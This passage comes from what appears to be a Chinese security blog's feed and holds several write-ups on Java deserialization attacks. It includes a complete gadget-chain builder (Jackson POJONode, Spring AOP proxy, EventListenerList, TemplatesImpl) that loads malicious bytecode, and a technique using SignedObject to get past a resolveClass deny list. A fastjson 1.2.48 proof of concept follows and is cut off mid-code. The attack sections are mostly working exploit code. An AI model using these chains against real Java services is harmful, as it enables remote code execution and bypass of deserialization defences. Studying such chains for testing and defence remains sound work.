com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.swing.event.EventListenerList;<br><span class="hljs-keyword">import</span> javax.swing.undo.UndoManager;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Vector;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jackson_EventListenerList</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// javassist 修改 BaseJsonNode</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.getCtClass(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            writeReplace.setBody(<span class="hljs-string">&quot;return $0;&quot;</span>);<br>            ctClass.writeFile();<br>            ctClass.toClass();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(Evil.class.getName()).toBytecode();<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes,ClassFiles.classAsBytes(jackson_BadAttributeValueExpException.Foo.class)&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_transletIndex&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">//使用 Spring AOP 中的 JdkDynamicAopProxy,确保只触发 getOutputProperties</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templatesImpl);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxy);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) getFieldValue(undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br>        setFieldValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(eventListenerList);<br>        oos.close();<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())));<br>        System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray())).length());<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>            <span class="hljs-keyword">if</span> ( field != <span class="hljs-literal">null</span> )<br>                field.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( clazz.getSuperclass() != <span class="hljs-literal">null</span> )<br>                field = getField(clazz.getSuperclass(), fieldName);<br><br>            <span class="hljs-keyword">return</span> field;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( NoSuchFieldException e ) &#123;<br>            <span class="hljs-keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;<br>                <span class="hljs-keyword">return</span> getField(clazz.getSuperclass(), fieldName);<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>invokeJoinpointUsingReflection:<span class="hljs-number">344</span>, AopUtils (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.support)<br>invoke:<span class="hljs-number">208</span>, JdkDynamicAopProxy (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.framework)<br>getOutputProperties:-<span class="hljs-number">1</span>, <span class="hljs-variable">$Proxy0</span> (com<span class="hljs-selector-class">.sun</span>.proxy)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect)<br>serializeAsField:<span class="hljs-number">689</span>, BeanPropertyWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>serialize:<span class="hljs-number">178</span>, BeanSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>defaultSerializeValue:<span class="hljs-number">1142</span>, SerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>serialize:<span class="hljs-number">115</span>, POJONode (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>serialize:<span class="hljs-number">39</span>, SerializableSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>serialize:<span class="hljs-number">20</span>, SerializableSerializer (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span><span class="hljs-selector-class">.ser</span>.std)<br>_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.ser)<br>serialize:<span class="hljs-number">1518</span>, ObjectWriter<span class="hljs-variable">$Prefetch</span> (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>_writeValueAndClose:<span class="hljs-number">1219</span>, ObjectWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>writeValueAsString:<span class="hljs-number">1086</span>, ObjectWriter (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span>.databind)<br>nodeToString:<span class="hljs-number">30</span>, InternalNodeMapper (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>toString:<span class="hljs-number">59</span>, BaseJsonNode (com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>toString:<span class="hljs-number">462</span>, AbstractCollection (java.util)<br>toString:<span class="hljs-number">1003</span>, Vector (java.util)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>toString:<span class="hljs-number">258</span>, CompoundEdit (javax<span class="hljs-selector-class">.swing</span>.undo)<br>toString:<span class="hljs-number">621</span>, UndoManager (javax<span class="hljs-selector-class">.swing</span>.undo)<br>valueOf:<span class="hljs-number">2994</span>, String (java.lang)<br>append:<span class="hljs-number">131</span>, StringBuilder (java.lang)<br>add:<span class="hljs-number">187</span>, EventListenerList (javax<span class="hljs-selector-class">.swing</span>.event)<br>readObject:<span class="hljs-number">277</span>, EventListenerList (javax<span class="hljs-selector-class">.swing</span>.event)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java二次反序列化</title>
    <link href="/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/18/java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="适合场景"><a href="#适合场景" class="headerlink" title="适合场景"></a>适合场景</h2><p>很多java题目，大都弄了个类继承<code>ObjectInputStream</code>，重写其<code>resolveClass</code>方法，在里面添加对反序列化类黑名单的校验。</p><h3 id="javaGuide"><a href="#javaGuide" class="headerlink" title="javaGuide"></a>javaGuide</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String payload)</span> &#123;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(payload);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">MyObjectInputStream</span> <span class="hljs-variable">myObjectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(decode));<br>            myObjectInputStream.readObject();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (InvalidClassException e) &#123;<br>            <span class="hljs-keyword">return</span> e.getMessage();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;exception&quot;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.javaguide;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InvalidClassException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectStreamClass;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();<br>        String[] denyClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;com.fasterxml.jackson&quot;</span>&#125;;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> denyClasses.length;<br><br>        <span class="hljs-keyword">for</span>(String denyClass : denyClasses) &#123;<br>            <span class="hljs-keyword">if</span> (className.startsWith(denyClass)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里把下列类给过滤了，但是我们又必须用到这些类，那么就必须使用二次反序列化</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax&quot;</span>, <span class="hljs-string">&quot;javax.management&quot;</span>, <span class="hljs-string">&quot;com.fasterxml.jackson&quot;</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>二次反序列化的原理是用一个不在黑名单里的类，让他触发readObject，然后在反序列化过程中再一次调用readObject，并且这个反序列化类我们可控</p><h3 id="SignedObject-getObject"><a href="#SignedObject-getObject" class="headerlink" title="SignedObject::getObject()"></a>SignedObject::getObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>        b.close();<br>        a.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法中的a可控，并且再一次进行了readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">list.add(badAttributeValueExpException);<br>KeyPairGenerator kpg=KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>kpg.initialize(<span class="hljs-number">1024</span>);<br>KeyPair keyPair=kpg.generateKeyPair();<br>PrivateKey privateKey=keyPair.getPrivate();<br>Signature signature=Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>SignedObject signedObject=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(list,privateKey,signature);<span class="hljs-comment">//list是第二次触发readObject的对象</span><br>signedObject.getObject();<br></code></pre></td></tr></table></figure><p>接下我们就可以衔接上一章提及的jsonArray类的toString方法会触发任意类的getter方法，那么就可以用它来触发getObject，然后在使用BadAttributeValueExpException触发他的toString方法，我们可以使用之后讲的EventListenerList的任意toString触发来执行也可以</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson原生反序列化</title>
    <link href="/2025/04/18/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/18/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="fastjson-1-2-48"><a href="#fastjson-1-2-48" class="headerlink" title="fastjson 1.2.48"></a>fastjson 1.2.48</h1><h2 id="版本和依赖"><a href="#版本和依赖" class="headerlink" title="版本和依赖"></a>版本和依赖</h2><p>jdk：1.8.0_66</p><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.19.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过之前的TemplatesImpl链分析我们知道他的getOutputProperties()会出发恶意字节码加载，在fastjson中的toString方法会自动调用toJsonString方法，因为是toString所以肯定会涉及到对象中的属性提取，从而出发getter()方法导致恶意类加载。</p><p>又因为BadAttributeValueExpException类的readObject能触发任意对象的toString方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>            val = <span class="hljs-literal">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>            val= valObj;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>                || valObj <span class="hljs-keyword">instanceof</span> Long<br>                || valObj <span class="hljs-keyword">instanceof</span> Integer<br>                || valObj <span class="hljs-keyword">instanceof</span> Float<br>                || valObj <span class="hljs-keyword">instanceof</span> Double<br>                || valObj <span class="hljs-keyword">instanceof</span> Byte<br>                || valObj <span class="hljs-keyword">instanceof</span> Short<br>                || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>            val = valObj.toString();<br>        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>            val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>我们可以通过反射的方式修改val的值从而出发jsonArray的toString方法</p><h2 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        JSONArray jsonArray=<span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(obj);<br>        BadAttributeValueExpException badAttributeValueExpException=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        Field 